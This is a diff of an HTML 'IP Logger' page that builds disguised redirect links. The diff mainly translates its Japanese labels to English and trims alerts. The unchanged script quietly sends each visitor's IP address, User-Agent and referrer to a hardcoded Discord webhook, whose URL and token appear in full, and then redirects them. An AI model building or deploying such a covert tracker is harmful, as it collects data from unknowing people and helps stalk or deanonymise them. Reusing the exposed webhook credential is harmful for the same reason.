@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger Builder</title>
+    <title>IP Logger</title>
     <style>
         body { background: #0f172a; color: #f8fafc; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #1e293b; padding: 2rem; border-radius: 8px; width: 450px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
@@ -16,28 +16,27 @@
 </head>
 <body>
     <div class="card" id="builder-view">
-        <h2>IP Logger リンク作成</h2>
+        <h2>IP Logger</h2>
         <div class="section">
             <label>リダイレクト先 URL:</label>
             <input type="text" id="redirect" placeholder="https://example.com">
         </div>
         <button onclick="generateLink()">リンクを生成</button>
         <div class="section" id="result-box" style="display:none;">
-            <label>生成されたトラッカーURL:</label>
+            <label>生成されたURL:</label>
             <input type="text" id="generated-url" readonly onclick="this.select()">
-            <button style="background: #10b981; margin-top: 5px;" onclick="copyLink()">クリップボードにコピー</button>
+            <button style="background: #10b981; margin-top: 5px;" onclick="copyLink()">コピー</button>
         </div>
     </div>
 
     <script>
         const FIXED_WEBHOOK = "https://discordapp.com/api/webhooks/1555186715466014862/0456yM7kfOwHW5-0olXBqF6rHXu-cWuCe1FCPRaA6CFwcmcKd7tH9uyN2WTY0sO8qoaa";
 
-        // URLパラメータがある場合はトラッカーとして動作させる
         const urlParams = new URLSearchParams(window.location.search);
         const targetRedirect = urlParams.get('to');
 
         if (targetRedirect) {
-            document.body.innerHTML = '<div style="background:#0f172a;color:#f8fafc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;"><p>リダイレクト中...</p></div>';
+            document.body.innerHTML = '<div style="background:#0f172a;color:#f8fafc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;"><p>Redirecting...</p></div>';
             
             (async function() {
                 try {
@@ -48,12 +47,12 @@
                     const payload = {
                         content: null,
                         embeds: [{
-                            title: "IPが記録されました",
+                            title: "IP Logged",
                             color: 5814783,
                             fields: [
-                                { name: "IPアドレス", value: "```" + clientIp + "```", inline: false },
+                                { name: "IP Address", value: "```" + clientIp + "```", inline: false },
                                 { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
-                                { name: "リファラー", value: "```" + (document.referrer || 'Direct') + "```", inline: false }
+                                { name: "Referer", value: "```" + (document.referrer || 'Direct') + "```", inline: false }
                             ],
                             timestamp: new Date().toISOString()
                         }]
@@ -71,15 +70,9 @@
 
         function generateLink() {
             const redirect = document.getElementById('redirect').value.trim();
-
-            if (!redirect) {
-                alert('リダイレクト先のURLを入力してください');
-                return;
-            }
-
+            if (!redirect) return;
             const baseUrl = window.location.href.split('?')[0];
             const finalLink = `${baseUrl}?to=${encodeURIComponent(redirect)}`;
-
             document.getElementById('generated-url').value = finalLink;
             document.getElementById('result-box').style.display = 'block';
         }
@@ -88,7 +81,6 @@
             const copyText = document.getElementById('generated-url');
             copyText.select();
             navigator.clipboard.writeText(copyText.value);
-            alert('リンクをコピーしました');
         }
     </script>
 </body>
